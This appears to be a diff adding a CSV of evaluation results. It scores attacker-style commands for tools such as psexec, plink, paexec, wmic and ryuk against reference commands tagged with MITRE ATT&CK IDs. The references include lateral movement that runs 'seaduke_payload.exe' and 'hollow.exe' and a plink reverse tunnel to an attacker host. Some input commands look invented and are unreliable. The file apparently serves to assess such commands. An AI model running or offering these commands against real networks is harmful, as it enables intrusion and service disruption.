@@ -1,0 +1,34 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0007_T1012.txt,adfind,"adfind -f ""HKLM\\SOFTWARE""","adfind -f ""(objectcategory=group)""`",0.393,True
+command_paexec_TA0007_T1046.txt,paexec,"paexec -n 30 -u <username> -p <password> //remote_host cmd /c ""net view"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.38,True
+command_paexec_TA0007_T1046.txt,paexec,"paexec -s -u <username> -p <password> \\remote_host ""services.msc"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.392,True
+command_paexec_TA0007_T1046.txt,paexec,"paexec -n 30 -u <username> -p <password> //remote_host ""wmic /node:<remote_host> path win32_service get name, state"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.345,True
+command_plink_TA0007_T1018.txt,plink,plink.exe -ssh <attacker_ssh_user>@<target_system_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.494,True
+command_plink_TA0007_T1018.txt,plink,plink.exe -R <listen-IP>:<listen-port>:<target_system_ip>:22,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.377,True
+command_plink_TA0007_T1018.txt,plink,plink.exe -ssh <attacker_ssh_user>@*,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.511,True
+command_plink_TA0007_T1018.txt,plink,plink.exe -R :22:<target_system_ip>:22 -ssh <attacker_ssh_user>@,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.497,True
+command_plink_TA0008_T1021.txt,plink,plink login.example.com -l attacker_username,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.372,True
+command_plink_TA0008_T1021.txt,plink,plink -ssh login.example.com -l attacker_username,"```sh
+plink -ssh #{user}@#{server}
+```",0.368,True
+command_plink_TA0008_T1021.txt,plink,plink -telnet login.example.com -l attacker_username,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.353,True
+command_psexec_TA0002_T1059.txt,psexec,psexec.exe -accepteula -nobanner -i -e <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.35,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""net stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.25,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""sc delete <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.249,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""net start <service_name> /y""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.246,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.251,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""taskkill /im <service_name>.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.273,True
+command_ryuk_TA0005_T1027.txt,ryuk,ryuk.exe --obfuscate --files <file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,0.506,True
+command_ryuk_TA0006_T1003.txt,ryuk,ryuk.exe --dump-credentials,`ryuk.exe --encrypt --process-name notepad.exe`,0.432,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Process call Create ""cmd /c calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.496,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Service set Name=""calc"", State=""start""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.356,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_PersistentVolume Set Caption=""C:\\Windows\\System32\\drivers\\etc""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.26,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_NetworkLoginSetting set UserName=""attacker_user"", Password=""password""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.201,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Directory Create Path=""C:\\Windows\\System32\\drivers\\etc"", Name=""testdir""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.219,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Environment Set Variable=""PATH"", Value=""C:\\Windows\\System32;C:\\Windows""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.26,True
